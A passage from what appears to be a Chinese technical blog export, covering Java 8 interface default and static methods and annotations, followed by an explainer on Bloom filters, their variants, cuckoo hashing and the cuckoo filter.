//在已构建好的日期时间上指定时区\n    LocalDateTime ldt2 = LocalDateTime.now(ZoneId.of(\"Europe/Tallinn\"));\n    ZonedDateTime zdt1 = ldt2.atZone(ZoneId.of(\"Europe/Tallinn\"));\n    System.out.println(zdt1);\n}\n```\n\n\n\n## 接口默认方法与静态方法\n\n### 默认方法\n\n- 在 Java8 以前，接口中只能有抽象方法(public abstract 修饰的方法)跟全局静态常量(public static final 常量  )\n- 在 Java8 中，允许接口中包含具有具体实现的方法，称为 “默认方法”，默认方法使用 default 关键字修饰\n\n```java\npublic interface MyFun {\n    T func(int a);\n\n    default Integer getAge(){\n        return 22;\n    }\n}\n```\n\n**默认方法的\"类优先\"原则**\n\n若一个接口中定义了一个默认方法，而另外一个父类或接口中又定义了一个同名的方法时\n\n（1）选择父类中的方法。如果一个父类提供了具体的实现，那么接口中具有相同名称和参数的默认方法会被忽略。\n\n1、新建一个接口 MyInterface1.java，里面有个默认实现方法 method1\n\n```java\npublic interface MyInterface1 {\n    default void method1() {\n        System.out.println(\"MyInterface1中的默认方法\");\n    }\n}\n```\n\n2、再建一个类 FatherClass.java，里面同样有一个同名的实现方法 method1\n\n```java\npublic class FatherClass {\n    public void method1() {\n        System.out.println(\"FatherClass中的方法method1\");\n    }  \n}\n```\n\n3、创建一个子类 SonClass.java，这个类继承 FatherClass 父类，并且实现 MyInterface1 接口。\n\n```java\npublic class SonClass extends FatherClass implements MyInterface1{\n\n}\n```\n\n4、测试这个子类创建后，调用 method1 方法，会调用哪个类或者接口中的实现方法？\n\n```java\n@Test\npublic void test01() {\n  SonClass sc = new SonClass();\n  sc.method1();\n}\n/**\nFatherClass中的方法method1\n**/\n```\n\n5、结果：调用父类中的方法，并不是接口中的实现方法。\n\n（2）接口冲突。如果一个接口提供一个默认方法，而另一个接口也提供了一个具有相同名称和参数列表的方法（不管方法是否是默认方法），那么必须覆盖该方法来解决冲突，子类必须指定覆盖哪个父接口中的方法。\n\n1、新建一个 MyInterface2 接口，同 MyInterface1 接口中方法同名。\n\n```csharp\npublic interface MyInterface2 {\n    default void method1() {\n        System.out.println(\"MyInterface2中的默认方法\");\n    }\n}\n```\n\n2、新建 SonClass2 类，实现了 MyInterface1，MyInterface2 两个接口，这时会提醒你要实现哪个接口中的默认方法，如下：\n\n```java\npublic class SonClass2 implements MyInterface1,MyInterface2{\n    @Override\n    public void method1() {\n        MyInterface1.super.method1();//覆盖MyInterface1\n    }\n\n}\n```\n\n3、测试\n\n```java\n@Test\n    public void test02() {\n        SonClass2 sc = new SonClass2();\n        sc.method1();\n    }\n```\n\n4、结果：调用 MyInterface1 中的默认方法\n\n### 静态方法\n\nJava8 中，接口中还允许添加静态方法\n\n```csharp\npublic interface MyInterface1 {\n  \n    default void method1() {\n        System.out.println(\"MyInterface1中的默认方法\");\n    }\n    \n    public static void say() {\n        System.out.println(\"这是MyInterface1中的静态方法\");\n    }\n}\n```\n\n调用方式：**接口名.方法名();**\n\n```css\nMyInterface1.say();\n```\n\n## 注解\n\nJava8 对注解处理提供了两点改进：可重复的注解及可用于类型的注解。\n\n### 重复注解\n\nJava8 以前的版本使用注解有一个限制是相同的注解在同一位置只能使用一次，不能使用多次。\n\nJava 8 引入了重复注解机制，这样相同的注解可以在同一地方使用多次。重复注解机制本身必须用 @Repeatable 注解。\n\n```java\npublic class Test01 {\n    //重复注解\n    @Test\n    @MyAnnotation(\"Hello\")\n    @MyAnnotation(\"World\")\n    public void test01() throws NoSuchMethodException {\n        Class<Test01> clazz = Test01.class;\n        Method test01 = clazz.getMethod(\"test01\");\n        MyAnnotation[] mas = test01.getAnnotationsByType(MyAnnotation.class);\n        for (MyAnnotation ma : mas) {\n            System.out.println(ma.value());\n        }\n    }\n}\n```\n\n### 类型注解\n\n- 1、Java 8 的类型注解扩展了注解使用的范围。在 Java 8之前，注解只能是在声明的地方所使用，Java8 开始，注解可以应用在任何地方。\n\n  - 1.创建类实例\n\n  - ```java\n    new @Interned MyObject();\n    ```\n\n  - 2.类型映射\n\n  - ```java\n    myString = (@NonNull String) str;\n    ```\n\n  - 3.implements 语句中\n\n  - ```java\n    class UnmodifiableList<T> implements@Readonly List<@Readonly T> { ... }\n    ```\n\n  - 4.throw exception声明\n\n  - ```java\n    void monitorTemperature() throws@Critical TemperatureException { ... }\n    ```\n\n- 2、新增 ElementType.TYPE_USE 和 ElementType.TYPE_PARAMETER（在Target上）\n\n  - ElementType.TYPE_PARAMETER 表示该注解能写在类型变量的声明语句中。\n\n  - ElementType.TYPE_USE 表示该注解能写在使用类型的任何语句中（例如：声明语句、泛型和强制转换语句中的类型）。\n\n例如，下面的示例。\n\n```\n@Target({ElementType.TYPE_PARAMETER, ElementType.TYPE_USE})\n@interface MyAnnotation {}\n```\n\n- 3、类型注解的作用：类型注解被用来支持在Java的程序中做强类型检查。配合第三方插件工具Checker Framework（注：此插件so easy,这里不介绍了），可以在编译的时候检测出runtime error（例如：UnsupportedOperationException；NumberFormatException；NullPointerException异常等都是runtime error），以提高代码质量。这就是类型注解的作用。\n\n## 参考\n\n- [Stream API - 简书 (jianshu.com)](https://www.jianshu.com/p/8e3b8a483bd8)\n- [ Java 8 学习笔记](https://blog.csdn.net/weixin_45225595/article/details/106203264)\n- [Optional类 - 简书 (jianshu.com)](https://www.jianshu.com/p/58b3f09a3429)\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Java8"],"categories":["JavaSE"]},{"title":"数据结构：布隆/布谷鸟","url":"/posts/35196.html","content":"\n## 布隆过滤器\n\n###  原理\n\n**论文名称：《Space/time trade-offs in hash coding with allowable errors》(在允许错误的哈希编码中，空间/时间的权衡)**  ——`该篇论文是布隆过滤器的开山之作`\n\n- 作者：Burton H.Bloom\n\n- 单位：Computer Usage Company, Newton Upper Falls, MA\n\n- 刊物：[Communications of the ACM](https://dl.acm.org/doi/10.1145/362686.362692)\n\n- 时间：1970年07月\n\n- 主要内容：给定一个 set，查找某个 key 是否存在于该 set，通常考虑三点：\n\n  1. time: 查找时间\n  2. space: 空间成本(例如 hash 目标区域大小)\n  3. 允许一定概率的误判，来获取空间成本的显著降低。\n\n------\n\n本质上布隆过滤器是一种比较巧妙的**概率型数据结构**（probabilistic data structure），特点是高效地插入和查询，可以用来告诉你 **“某样东西一定不存在或者可能存在”**。相比于传统的 List、Set、Map 等数据结构，它更高效、占用空间更少，但是缺点是其返回的**结果是概率性的**，而不是确切的。\n\n**BF的组成：**\n\n1. n 个 待插入的 key\n2. m bits 的空间 v，全部初始化为0\n3. k 个无关的 hash 函数：`h1, h2, ..., hk`，hash 结果为` {0, 1, ..., m-1}`\n\n具体的，对于 `key=a`，经过 k 个 hash 函数后结果为 `h1(a), h2(a), ..., hk(a)`\n\n那么就将 v 对应的 bit 置为 1，假定 k 为 4，对应的 bloom filter 为：\n\n![](https://img.jwt1399.top/img/bloom_filter_with_4_hash_functions.gif)\n\n### 插入\n\n布隆过滤器上面说了，就是一个二进制数据的集合。当一个数据加入这个集合时，经历如下洗礼：[【动态演示】](file:///Users/jianjian/Desktop/bloom-learn/zh_CN/index.html)\n\n- 通过 K 个哈希函数计算该数据，返回 K 个计算出的 hash 值\n- 这 K 个 hash 值映射到对应的 K 个二进制的数组下标\n- 将 K 个下标对应的二进制数据改成 1 。\n\n例如，将“你好”存入布隆过滤器，第一个哈希函数返回 3，第二个第三个哈希函数返回 5 与 7 ，那么布隆过滤器对应的下标3，5，7的位置改成1。\n\n![](https://img.jwt1399.top/img/640-20220125184517663)\n\n### 查找\n\n布隆过滤器主要作用就是查询一个数据，在不在这个二进制的集合中，查询过程如下：\n\n- 通过 K 个哈希函数计算该数据，对应计算出的 K 个 hash 值\n- 通过 hash 值找到对应的二进制的数组下标\n- 判断：如果存在一处位置的二进制数据是 0，那么该数据不存在。如果都是1，该数据存在集合中。\n\n我们假设 BF 是一个 12bit 的二进制向量，{h1,h2}是两个哈希函数，{x,y,z}是一个集合。 用户想查询关键字 w,查询结果显示 w 在集合中不存在。\n\n![](https://img.jwt1399.top/img/image-20220126235419137.png)\n\n### 假阳性\n\n> 宁可错杀三千，绝不放过一个\n\n当 key 越来越多，v 里置为 1 的 bits 越来越多，前面被置 1 的位置可能就会被覆盖，此时就有概率发生误判，更专业的术语称为 **false positive(假阳性)**，也就是说当我们在 bloom filter 查找 key 时，有返回两种情况：\n\n1. key 不存在，那么 key **一定不存在**。\n2. key 存在，那么 key **可能存在**。\n\n也就是说 bloom filter 具有一定的**误判率**。\n\nm 越大，k 越大， n 越小，那么 **false positive**越小，更进一步，bloom filter 是关于空间和 **false positive** 的 tradeoff，bloom filter 的算法其实并不复杂，其真正的艺术在于这种平衡。\n\n### 误报率和哈希个数\n\n布隆过滤器需相关参数如下：\n\n- n：插入元素的个数\n- ρ：插入n 个元素的情况下的误报率\n- m：布隆过滤器位数\n- k：每插入一个元素进行的哈希轮数\n\n构造时会提供 n 和 ρ 根据这两个参数会计算出布隆过滤器的大小 m，哈希函数的个数 k\n\n它们之间的关系比较简单：\n\n- 误报率越低，布隆过滤器就需要越长，但是控件占用较大\n- 误报率越低，或者 hash 函数越多，但是计算耗时较长\n\n> 如何选择合适的哈希函数个数 k 和布隆过滤器长度 m，有人推导出了如下公式\n\n- n：插入元素的个数\n- ρ：插入n 个元素的情况下的误报率\n- m：布隆过滤器位数\n- k：每插入一个元素进行的哈希轮数\n\n1、根据 ρ 和  n 可以计算出  m 和  k\n\n|                        布隆过滤器位数                        |                       最优哈希函数个数                       |\n| :----------------------------------------------------------: | :----------------------------------------------------------: |\n| ![](https://img.jwt1399.top/img/AF7D2AC5-2634-478A-9592-5FBC5106BA39.png) | ![](https://img.jwt1399.top/img/AC392E3A-F8F1-4CDC-903E-4066AB085A47.png) |\n\n2、根据 m、 n、k 可以计算出 ρ\n\n![](https://img.jwt1399.top/img/1*4QvZrOV7d9XgQXqVaIOGPg.png)\n\n### 哈希选取\n\n2008年5月哈佛大学的一篇论文指出**可以使用 2 个哈希函数来模拟多个哈希函数**\n\n**论文名称：《Less hashing, same performance: Building a better Bloom filter》(更少的散列，相同的性能：构建更好的布隆过滤器)**\n\n- 作者：Adam Kirsch\n- 单位：哈佛大学\n- 刊物：[ESA'06: Proceedings of the 14th conference on Annual European Symposium](https://www.eecs.harvard.edu/~michaelm/postscripts/rsa2008.pdf)【CCF B】\n- 时间：2008年05月\n- 主要内容：散列文献中的一种标准技术是使用两个哈希函数 h<sub>1</sub>(x) 和 h<sub>2</sub>(x) 来模拟 g<sub>i</sub>(x) = h<sub>1</sub>(x) + ih<sub>2</sub>(x) 的附加哈希函数。我们证明了这种技术可以有效地应用于 Bloom 过滤器和相关的数据结构。具体地说，**只需两个哈希函数就可以有效地实现一个Bloom过滤器**，而不会在渐近假阳性概率上有任何损失。这将导致更少的计算，并且在实践中可能更不需要随机性。\n\n这篇论文涉及大量的数学推导，一共 32 页，🥹🥶😭，我当然是没有看完的，感兴趣的大佬可以仔细阅读，可以把我上面主要思想中的叙述作为一个结论在工程实践中使用。\n\n另一个重点：由于使用布隆过滤器的唯一目的是为了更快地搜索，我们不能使用慢散列函数，Sha-1、MD5 等加密哈希函数对于布隆过滤器来说不是很好的选择，因为它们有点慢。因此，更快的散列函数实现的更好，最好选择 [murmur](https://sites.google.com/site/murmurhash/)、[fnv](http://isthe.com/chongo/tech/comp/fnv/)系列散列、Jenkins 散列和[HashMix](https://www.google.com/codesearch/url?ct=ext&url=http://www.concentric.net/~Ttwang/tech/inthash.htm&usg=AFQjCNEBOwEAd_jb5vYSckmG7OxrkeQhLA)散列\n\n### 优缺点\n\n**优点：**\n\n1. 集合元素可以增加\n2. 判断的时间复杂度为O(n)，空间复杂度为O(1)\n\n**缺点：**\n\n1. 集合中的元素只能增加不可以删除\n2. 存在一定的假阳率，也就是说，存在一定的可能性，该元素不在集合中，但是判断的结果却表明在集合中\n\n### 使用场景\n\n#### 场景列表\n\n- 大集合中重复元素的判断\n\n- 使用布隆过滤器减少对不存在的资源或不被允许的请求进行耗费性能的网络查找\n\n- 防止用户更改产品id进行重新请求而导致的缓存击穿\n\n- 利用布隆过滤器减少磁盘IO或者网络请求\n\n- 爬虫系统中，对URL进行去重\n\n- **URL黑名单、白名单**，比如Chrome浏览器就是使用了一个布隆过滤器识别恶意链接。\n\n- Redis防雪崩（缓存穿透）\n\n- 邮箱系统的垃圾邮件过滤\n\n- 谷歌Bigtable、Apache HBase、Apache Cassandra和PostgreSQL使用布隆过滤器来**减少对不存在的行或列的磁盘查找**(加快数据库查询过程)。\n\n- **解决缓存穿透问题**，缓存穿透指查询一个不存在的数据，这时候缓存中不存在，就会不断的查询数据库，造成不必要的IO，而且有人如果恶意使用不存在的key也可以对数据库进行攻击。\n\n- 高并发秒杀系统中抢红包系统中判断用户是否今天已领取红包\n\n- LevelDB增加查询效率\n\n  -  LevelDB利用布隆过滤器判断指定的key是否存在于sstable中，若过滤器表示不存在，则该key一定不存在。\n\n- 视频网站，使用布隆过滤器来检查推荐的视频内容是否已经被推荐过。\n\n- 一些交友软件，每次抓取一批推荐给用户前端，利用一个布隆过滤器来完成记录，每次检查是否已被推荐过\n\n#### 具体场景1\n\n> 你接到一个新的开发需求，需要你为用户注册服务设计一个用户名检查的 API 接口, 这个接口会根据用户输入的用户名与系统中所有账号的用户名进行匹配检查，如果用户名已经存在，则会提示用户该名称已被使用,无法进行注册，如果名称未被占用，则返回允许注册。\n\n这个需求是不是听上去很简单，实现上我们有以下的几种方案：\n\n- **方案一**：每次注册验证的时候直接去数据库执行SQL, 检查是否存在相同用户名。\n  - 最简单，除了原数据库存储外，不需要外部的数据存储服务，但是每次查询进行全表扫描，特别是涉及到注册用户较多，分库分表设的情况下，资源开销可不是一般的大，查询效率肯定也不会太好。\n-  **方案二**：导出一份用户名列表到缓存（定期或者使用消息队列），每次单独的查询缓存完成检查\n  - 内存数据查询效率比第一种要好一些，但是需要额外维护一套缓存服务，运维成本也不小，另外数据存储服务在数据量较大的情况下占用的内存开销也会较大。\n\n-  **方案二**：通过一个布隆过滤器来完成校验，这种方式具有维护简单，占用资源少，查询效率高的优势\n\n#### 具体场景2\n\n> 假如需要过滤某些不安全网页，现有 100 亿个黑名单页面，每个网页的URL最多占用 64 字节。现要设计一种网页过滤系统，可以根据网页的URL判断该网页是否在黑名单上。\n\n- **方案一**：最直观的想法必然是使用一个集合或者说数据结构来存放黑名单 URL，比如查找树、Set、map\n  - 但是无论上方哪种，不可避免的是我们需要存储原始的 URL 值，但是 URL 并不是一个很短的字符串，动辄十几/几十字节，假设一个 URL 有30 字节那么 100 亿 URL 所占内存就是十几 G，所以每次判断是否存在于黑名单中，就要占用很大的内存开销。\n- **方案二**：但是，我们需要的仅仅是知道是否存在这一需求，可以不需要具体的URL，所以仅仅对Ture or False 这个问题，可以使用位图（BitMap）算法，位图顾名思义就是，每个map 值都使用 1bit，这样大大降低了内存开销，具体做法是，我们使用一个Hash函数将URL 映射到大小为 n 的 bit 数组中，并置相应位置为 True 这样我们可以在尽可能低的内存开销下，实现 O(1) 时间的判断 URL 是否存在黑名单中。但不得不面对的一个问题就是，即使采取再好的哈希函数，都会出现哈希冲突的情况，在查询阶段出现哈希冲突意味着**查询错误，**会返回一个错误的结果，而想尽可能的降低哈希冲突，我们需要位图大小比黑名单中 URL 数量大的多，我们考虑随机哈希的情况下，查询碰撞的概率是：黑名单 URL 数量 /位图大小。所以要想查询准确率高，又带来了更高的内存开销，而可以有效改善这种情况的一种数据结构叫做**布隆过滤器（Bloom Filter）**\n\n#### 具体场景3\n\n> 海量数据下的去重和查重：10亿个正整数，给定一个数值，如何快速判定该数值是否在 10 亿个正整数当中？假如机器只有 1G 内存？\n\n我们来估计一下上面所需要用到的内存，1G 约等于 10<sup>9</sup> 个字节，上面的数字都是 int 型，一个 int 占用 4 字节，所以问题一可能需要占用 4G 内存，显然需要的内存太大了，传统的方法显然是不能用了，就可以使用布隆过滤器\n\n- 首先初始化一个 int 数组，每个元素对应 32 位比特（int 占用 4 字节，1字节 8 个比特位）\n- 将 10 亿个元素分别读入内存，对 int 数组中的元素比特位进行标记。如果存在，标记为 1 即可\n- 原先一个 int 类型只能表示一个整数，现在一个 int 能表示 32 个整数，相当于是节省了 32 倍的内存\n- 标记完之后，即可快速判定某个元素是否在 10 亿个正整数当中，时间复杂度为 O(1)\n\n![](/Users/jianjian/jwt1399.github.io/source/images/布隆过滤器VS布谷鸟~/image-20220401105325154.png)\n\n### 参考文章\n\n- [Bloom Filters - the math (wisc.edu)](https://pages.cs.wisc.edu/~cao/papers/summary-cache/node8.html)\n- [布隆(Bloom Filter)过滤器—redis集成布隆过滤器—Java使用布隆过滤器](https://blog.csdn.net/qq_41125219/article/details/119982158)\n- 论文：[papers of bloom filter - Ying's Blog (izualzhy.cn)](https://izualzhy.cn/bloom-filter-paper#:~:text=Space%2FTime Trade-offs in Hash Coding with Allowable Errors,在1970年发表的文章，布隆过滤器的开山之作。 给定一个 set，查找某个 key 是否存在于该 set，通常考虑两点： time%3A 查找时间)\n- [leveldb笔记之9:bloom filter - Ying's Blog (izualzhy.cn)](https://izualzhy.cn/leveldb-bloom-filter)\n- 误报率：[布隆过滤器在一个测试场景中的应用](https://zhuanlan.zhihu.com/p/407540513)\n- 误报率：[布隆过滤器假阳率公式推导](https://zhuanlan.zhihu.com/p/397034269)\n- 误报率：[Probabilistic Data structures: Bloom filter | HackerNoon](https://hackernoon.com/probabilistic-data-structures-bloom-filter-5374112a7832)\n- [白话布隆过滤器BloomFilter (bbsmax.com)](https://www.bbsmax.com/A/RnJW3DROJq/)\n- [【分布式】Bloom Filter 与 Cuckoo Filter - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/131285273)\n- [初探布隆过滤器 - 掘金 (juejin.cn)](https://juejin.cn/post/6844903810108751879)\n- [【大数据算法】Counting Bloom Filter 的原理和实现 - 掘金 (juejin.cn)](https://juejin.cn/post/6844903503815524365)\n- [详解布隆过滤器的原理，使用场景和注意事项 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/43263751)\n- [结合Guava源码解读布隆过滤器 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/85042394)\n- [使用Bloom Filter模拟器，带你一分钟了解布隆过滤器原理](https://blog.csdn.net/weixin_44930887/article/details/109529519)\n- 场景1来源：[一篇文章读懂布隆过滤器](https://www.jianshu.com/p/ee1770b748a0)\n- 场景2来源：[布隆过滤器（Bloom Filter）详解及应用 ](https://www.cnblogs.com/zhaodongge/p/15017574.html)\n- 误报率计算器：[Bloom filter calculator (hur.st)](https://hur.st/bloomfilter/)\n- 动态交互：[Bloom Filters by Example (llimllib.github.io)](https://llimllib.github.io/bloomfilter-tutorial/)\n- 动态交互：[Bloom Filters (jasondavies.com)](https://www.jasondavies.com/bloomfilter/)\n- 误报率计算器：[Bloom Filter Calculator (krisives.github.io)](https://krisives.github.io/bloom-calculator/)\n- [海量数据下的去重和查重（一）：BitMap位图法 ](https://www.jianshu.com/p/8d074e8d02aa)\n- [为什么抖音从来没有重复内容？](https://3g.163.com/dy/article/FO0HMBAG0536882Y.html?referFrom=baidu&spss=adap_dy)\n\n## 布隆过滤器变体\n\n布隆过滤器的变体十分多，主要是为了解决布隆过滤器算法中的一些缺陷或者劣势。常见的变体如下：\n\n| 序号 | 变体名称                       | 简称  | 变体描述                                                     | 来源                                                         | 等级(CCF) |\n| ---- | ------------------------------ | ----- | ------------------------------------------------------------ | ------------------------------------------------------------ | --------- |\n| 1    | Counting Bloom Filter          | CBF   | 加入Counter，实现删除操作                                    | [ACM Transactions on Networking](https://ieeexplore.ieee.org/document/851975) | A         |\n| 2    | Accurate Counting Bloom Filter | ACBF  | 将 Counter 数组划分成多个层级，来降低误判率                  | [Mathematical Problems in Engineering](https://www.hindawi.com/journals/mpe/2013/516298/) | ——        |\n| 3    | Dynamic Count  Filter          | DCF   | 使用两个数组来存储所有的counter，改进CBF                     | [SIGMOD Record](https://dl.acm.org/doi/10.1145/1121995.1122000) | ——        |\n| 4    | Spectral Bloom Filters         | SBF   | CBF的扩展，提供查询集合元素的出现频率功能                    | [ACM SIGMOD'03](https://dl.acm.org/doi/10.1145/872757.872787) | A         |\n| 5    | Compressed Bloom Filter        |       | 对位数组进行压缩                                             | [ACM Transactions on Networking](https://ieeexplore.ieee.org/document/1041067) | A         |\n| 6    | d-Left Counting Bloom Filter   | dlCBF | 解决哈希表的负载平衡问题                                     | [ESA'06](https://dl.acm.org/doi/10.1007/11841036_61)         | B         |\n| 7    | Hierarchical Bloom Filters     | HBF   | 分层，由多层布隆过滤器组成                                   | [CCS '04](https://dl.acm.org/doi/proceedings/10.1145/1030083) | A         |\n| 8    | Time-Decaying Bloom Filters    | TDBF  | 计数器数组替换位向量，优化每个计数器存储其值所需的最小空间   | [EDBT '13](https://dl.acm.org/doi/10.1145/2452376.2452405)   | B         |\n| 9    | Bloomier Filters               |       | 存储函数值，不仅仅是做位映射                                 | [ACM SODA '04](https://dl.acm.org/doi/10.5555/982792.982797) | A         |\n| 10   | Dynamic Bloom  Filter          | DBF   | 改进SBF                                                      | [IEEE Transactions on Knowledge and Data Engineering](https://ieeexplore.ieee.org/document/4796196) | A         |\n| 11   | Dynamic Bloom Filter Array     | DBA   | DBA在可扩展性、误判率控制和内存空间效率等方面均优于现有的DBF方法。 | [IEEE Transactions on Parallel and Distributed Systems](https://ieeexplore.ieee.org/document/6005420) | A         |\n\n###  Counting Bloom Filter(CBF)\n\n**论文名称：《Summary cache: a scalable wide-area Web cache sharing protocol》(摘要缓存：可扩展的广域 Web 缓存共享协议)**  \n\n- 作者：Li Fan; Pei Cao; J. Almeida; A.Z. Broder\n- 单位：Cisco Systems\n- 刊物：[ACM Transactions on Networking](https://ieeexplore.ieee.org/document/851975)\n- 时间：2000年06月\n\n------\n\n#### 引出\n\n![](/Users/jianjian/jwt1399.github.io/source/images/布隆过滤器VS布谷鸟~/v2-865983a6709550d9ffa3887c54514a0b_b.jpg)\n\n假如有这么一个情景\n\n- 放入数据包 1 时，将 bitmap 的 1，3，6 位设置为了 1\n- 放入数据包 2 时，将 bitmap 的 3，6，7 位设置为了 1\n- 此时一个并没有存过的数据包请求 3，做三次哈希之后，对应的 bitmap 位点分别是 1，6，7\n- 这个数据之前并没有存进去过，但是由于数据包 1 和 2 存入时将对应的点设置为了1，所以也会认为数据包 3 存入了 bitmap\n- 随着存入的数据增加，前面的现象就会越来越严重\n\n布隆过滤器没法删除数据，删除数据存在以下两种困境：\n\n- 1、由于有误判的可能，并不确定数据是否存在数据库里，例如数据包3\n\n- 2、当你删除某一个数据包对应位图上的标志后，可能影响其他的数据包，例如上面例子中，如果删除数据包1，也就意味着会将  1，3，6 位设置为0，此时数据包 2 来请求时，会显示不存在，因为 3，6 两位已经被设置为 0 \n\n#### 原理\n\n为了解决上面布隆过滤器的问题，出现了一个增强版的布隆过滤器(Counting Bloom Filter)，这个过滤器的思路是将布隆过滤器的 bitmap 更换成数组，数组的每一位扩展为一个小的计数器(Counter)，当数组某位置被映射一次时就 +1，当删除时就 -1，这样就避免了普通布隆过滤器删除数据后需要重新计算其余数据包 Hash 的问题，但是依旧没法避免误判。\n\n![](/Users/jianjian/jwt1399.github.io/source/images/布隆过滤器VS布谷鸟~/v2-6cd14beef39ff330a630ca08158814ea_b.jpg)\n\nCounting Bloom Filter 通过多占用几倍的存储空间的代价，给 Bloom Filter 增加了删除操作。下一个问题自然就是，到底要多占用几倍呢？\n\n直接给结论吧：每个 Counter 分配 4 位，对于大多数应用程序来说就足够了。详细证明过程可以去看论文\n\n#### 参考\n\n- [Counting Bloom Filter | Programming.Guide](https://programming.guide/counting-bloom-filter.html)\n- [Bloom Filter和Counting Bloom Filter](https://www.cnblogs.com/the-zym/p/13217986.html)\n- [Counting Bloom Filter](https://blog.csdn.net/jiaomeng/article/details/1498283)\n- [Counting Bloom Filter 的原理和实现](https://cloud.tencent.com/developer/article/1136056)\n- [布隆过滤器之Counting Bloom Filter](https://sustcoder.github.io/2019/01/11/2019-01-11-bloom-filter/)\n- [Summary Cache: A Scalable Wide-Area Web Cache Sharing Protocol](http://www.cs.wisc.edu/~jussara/papers/00ton.pdf)\n- [冷饭新炒：理解布隆过滤器算法的实现原理 | Throwable (throwx.cn)](https://throwx.cn/2021/08/21/bloom-filter/)\n\n### Accurate Counting Bloom Filter(ACBF)\n\n通过 offset indexing 的方式将 Counter 数组划分成多个层级，来降低误判率。\n\n[Accurate Counting Bloom Filters for Large-Scale Data Processing](https://www.hindawi.com/journals/mpe/2013/516298/)\n\n###  Dynamic Count  Filter(DCF)\n\n为改进SBF的缺点，人们又发明了DCF（Dynamic Count Filter），其使用两个数组来存储所有的counter，它们的长度都为m（即bloom filter的位数组长度）。第一个数组是一个基本的CBF（即下图中的CBFV，counting bloom filter vector），counter的长度固定，为x = log(M/n)，其中M是集合中所有元素的个数，n为集合中不同元素的个数。第二个数组用来处理counter的溢出（即下图中的OFV，overflow vector），数组每一项的长度并不固定，根据counter的溢出情况动态调整。\n\n\n[Dynamic count filters | ACM SIGMOD Record](https://dl.acm.org/doi/10.1145/1121995.1122000)\n\n[计数式布隆过滤器](https://blog.csdn.net/vipshop_fin_dev/article/details/102647115)\n\n[ Dynamic Count Filter](https://blog.csdn.net/jiaomeng/article/details/1543751)\n\n### Compressed Bloom Filter\n\n[Compressed bloom filters - Networking, IEEE/ACM Transactions on (harvard.edu)](http://www.eecs.harvard.edu/~michaelm/postscripts/ton2002.pdf)\n\n### Spectral Bloom Filter(SBF)\n\nSaar Cohen, Yossi Matias 2003.6\n\n[SIGMOD '03: Proceedings of the 2003 ACM SIGMOD international conference on Management of data](https://dl.acm.org/doi/proceedings/10.1145/872757)\n\n在 CBF 的基础上提出了元素出现频率查询的概念，将CBF的应用扩展到了 multi-set 的领域；\n\n[sbf-sigmod-03.pdf (stanford.edu)](http://theory.stanford.edu/~matias/papers/sbf-sigmod-03.pdf)\n\n### d-Left Counting Bloom Filter(dlCBF)\n\n利用 d-left hashing 的方法存储 fingerprint，解决哈希表的负载平衡问题；\n\n[An improved construction for counting bloom filters | Proceedings of the 14th conference on Annual European Symposium - Volume 14 (acm.org)](https://dl.acm.org/doi/10.1007/11841036_61)\n\n## 布谷鸟哈希\n\n### 引出\n\n哈希的本质是从**一个较大空间映射**到**一个较小的空间**，因此在插入数据足够多之后，根据**鸽巢原理**，**一定会存在位置冲突**。常见的哈希表（Hash Table 或者 dictionary）会通过**链表**、**开放地址探测**等方式来处理冲突。\n\n单桶多函数的布谷鸟哈希，便是开放地址法处理冲突的一种哈希表，只不过有冲突后，不是通过线性寻找新的位置，而是通过额外哈希函数来寻找。Cuckoo Hashing 是一种鸠占鹊巢的策略。\n\n### 原理\n\n**论文名称：《Cuckoo Hashing》**——`该篇论文是布谷鸟哈希的开山之作`\n\n- 作者：Rasmus Pagha，Flemming Friche Rodlerb\n- 单位：Aarhus University\n- 刊物：[ACM Journal of Algorithms](https://www.di.ens.fr/~vergnaud/algo0910/Cuckoo.pdf)\n- 时间：2004年05月\n\n------\n\n基本思想：使用`两个哈希函数 h1、h2` 和`两个哈希桶 T1、T2`， 对一个 `key` 进行哈希，得到桶中的两个位置\n\n- 如果两个位置都为空，随便选一个插入 key\n- 如果只有一个位置为空，则存入为空的位置\n- 如果都不为空，则随机踢出一个元素\n- 踢出的元素，重复上述过程，插入元素\n\n当然假如存在绝对的空间不足，那老是踢出也不是办法，所以一般会设置一个**踢出阈值**，如果在某次插入行为过程中连续踢出，则说明哈希桶满了，超过阈值，则进行扩容。\n\n- p1 = hash1(x) % L\n- p2 = hash2(x) % L\n\n![](https://img.jwt1399.top/img/ifWcXxkJCNYbuph.png)\n\n### 变种\n\n布谷鸟哈希可以有很多变种，比如：\n\n1. 使用**两个**哈希函数和**一个**哈希桶。\n2. 使用**两个**哈希函数和**四路**哈希桶。\n\n![](https://img.jwt1399.top/img/1617168-20210727195625561-1153589445.jpg)\n\n可以证明，后者的桶的利用率会更高，后面讲布谷鸟过滤器会细说原因\n\n## 布谷鸟过滤器\n\n**论文名称：《Cuckoo Filter: Practically Better Than Bloom》(布谷鸟过滤器：实际上比布隆过滤器更好)** ——`该篇论文是布谷鸟隆过滤器的开山之作`\n\n- 作者：Bin Fan, Dave G. Andersen, Michael Kaminsky, Michael D. Mitzenmacher\n- 单位：卡内基梅隆大学\n- 刊物：[CoNEXT '14](https://dl.acm.org/doi/10.1145/2674005.2674994)【CCF B】\n- 时间：2014年12月\n- 主要内容：我们`提出了一种称为布谷鸟滤波器的新数据结构`，它可以取代 Bloom 过滤器进行近似集合查询测试。布谷鸟过滤器**支持动态添加和删除元素**，同时实现比 Bloom 过滤器**更高的性能**。对于存储许多项目并针对中等低误报率的应用程序，布谷鸟过滤器的**空间开销**低于空间优化的 Bloom 过滤器。\n\n------\n\n论文直接说到布隆过滤器的缺点：\n\n- Bloom过滤器的一个限制是：在不重新构建整个过滤器的情况下，不能删除现有项。\n\n论文中也提到了布谷鸟过滤器 4 大优点：\n\n- 1、支持动态的新增和删除元素；\n- 